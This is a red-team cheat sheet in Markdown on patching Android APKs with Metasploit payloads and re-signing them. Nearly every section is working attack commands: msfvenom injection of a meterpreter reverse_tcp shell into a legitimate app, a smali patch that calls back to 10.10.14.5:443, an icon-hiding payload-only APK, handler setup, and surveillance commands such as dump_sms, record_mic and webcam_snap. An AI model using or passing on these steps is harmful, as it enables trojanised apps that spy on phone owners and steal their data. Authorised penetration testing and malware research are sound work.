---
tags:
  - redteam
  - android
  - mobile
  - tooling
created: 2026-08-29
status: complete
---

# 🤖 APK Patching & Re-signing

> [!abstract] TL;DR
> Android refuses to install unsigned/mismatched-signature APKs. Any modified
> APK must be re-signed. Full flow: decompile → patch/inject → build → sign → align.

---

## 1. Tooling (Kali)

```bash
sudo apt install apktool smali baksmali apksigner zipalign default-jdk
# also useful: jadx (static analysis), drozer (post-install testing)
```

---

## 2. Flow A — msfvenom Injection into Existing APK

```bash
# 1) Decompile
apktool d original.apk -o orig/

# 2) Inject payload using decompiled dir as template
msfvenom -x orig/ -p android/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=443 -o evil.apk

# 3) Align + sign
zipalign -v 4 evil.apk evil-aligned.apk
keytool -genkey -v -keystore my.keystore -alias app -keyalg RSA -keysize 2048 -validity 365
apksigner sign --ks my.keystore --out evil-signed.apk evil-aligned.apk

# 4) Verify
apksigner verify --print-certs evil-signed.apk
```

---

## 3. Flow B — Manual Patch (smali-level, more control)

```bash
apktool d original.apk -o orig/

# Inspect entry point:
grep -r "android.intent.action.MAIN" orig/AndroidManifest.xml
# → find launcher activity class, e.g. com.acme.app.MainActivity

# Inject payload load into smali — add to MainActivity.smali onCreate:
#   const-string v0, "10.10.14.5"
#   const/16 v1, 443
#   invoke-static {v0, v1}, Lcom/metasploit/meterpreter/AutoRunner;->go(Ljava/lang/String;I)V
# (drop metasploit smali payload classes into orig/smali/com/metasploit/)

apktool b orig/ -o evil.apk
# then sign as Flow A step 3
```

---

## 4. Payload-Only APK

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -o rev.apk
# Options worth knowing:
msfvenom -p android/meterpreter/reverse_tcp --list-options
#   AndroidMeterpreter options: HideAppIcon, WakeLock, AndroidWakelockTimeout...
```

Handler:

```bash
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0 set LPORT 443
set ExitOnSession false
exploit -j
```

Meterpreter android goodies: `check_root`, `dump_sms`, `dump_contacts`,
`geolocate`, `webcam_list` / `webcam_snap`, `record_mic`, `activity_start`,
`app_install` / `app_uninstall`, `wlan_geolocate`.

---

## 5. Troubleshooting

> [!warning] Common fails
> - **"App not installed"** → signature mismatch with an existing install:
>   uninstall the original first, or bump `versionCode` in `apktool.yml`
> - **Install parses but crashes** → smali patch broke the class; check
>   `adb logcat` for stack trace
> - **`zipalign` after `apksigner`** breaks v2/v3 signatures — always
>   align FIRST, sign LAST
> - **API level issues** → check `minSdkVersion` vs payload smali target

---

## 6. Static Analysis Quick Reference

```bash
jadx-gui evil.apk                 # decompile to java for review
apksigner verify -v evil.apk      # signature scheme versions
aapt dump badging evil.apk        # permissions, activities
```

Related: [[msfvenom — Payload Generation Guide]] · [[Meterpreter]] · [[Metasploit Framework]]